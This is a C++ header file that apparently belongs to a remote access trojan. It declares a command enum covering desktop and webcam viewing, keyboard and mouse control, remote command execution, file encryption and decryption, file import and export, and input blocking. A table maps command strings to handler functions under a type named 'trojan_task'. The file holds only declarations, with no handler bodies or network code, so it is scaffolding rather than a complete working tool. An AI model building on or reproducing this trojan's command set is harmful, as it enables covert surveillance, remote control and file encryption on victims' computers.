#pragma once

#ifndef __COMMANDS_HPP_INCLUDED__
#define __COMMANDS_HPP_INCLUDED__

#include "..\Constants.h" // TODO: Remove, when all functions will be enabled

enum class Command
{
	MESSAGEBOX,
	VIEWDESKTOP_START,
	VIEWDESKTOP_STOP,
	VIEWWEBCAM_START,
	VIEWWEBCAM_STOP,
	KEYBOARDCTRL,
	MOUSECTRL,
	EXECUTECMD,
	ENCRYPTFILE,
	DECRYPTFILE,
	IMPORTFILE,
	EXPORTFILE,
	BLOCKINPUT,
	PLAYSOUND,

	NUMBER_OF_COMMAND,
	UNDEFINEDCMD = -1
};

std::string ExecuteCommand(INT code, std::string &args);
VOID _on_task_MESSAGEBOX(CONST PVOID args, std::string &result);
VOID _on_task_VIEWDESKTOP(CONST PVOID args, std::string &result);
VOID _on_task_MOUSECTRL(CONST PVOID args, std::string &result);
VOID _on_task_EXECUTECMD(CONST PVOID args, std::string &result);

using trojan_task = std::function<VOID(CONST PVOID, std::string&)>;

CONST std::map<std::pair<std::string, Command>, trojan_task> MAP_COMMANDS
{
	{ { TEXTH("message"), Command::MESSAGEBOX }, _on_task_MESSAGEBOX },
	{ { TEXTH("desktop"), Command::VIEWDESKTOP_START }, _on_task_VIEWDESKTOP },
	{ { TEXTH("mouse"  ), Command::MOUSECTRL  }, _on_task_MOUSECTRL  },
	{ { TEXTH("execute"), Command::EXECUTECMD }, _on_task_EXECUTECMD }
};

Command     cmd2code(CONST std::string &cmd);
std::string code2cmd(Command cmd);

#endif /* __COMMANDS_HPP_INCLUDED__ */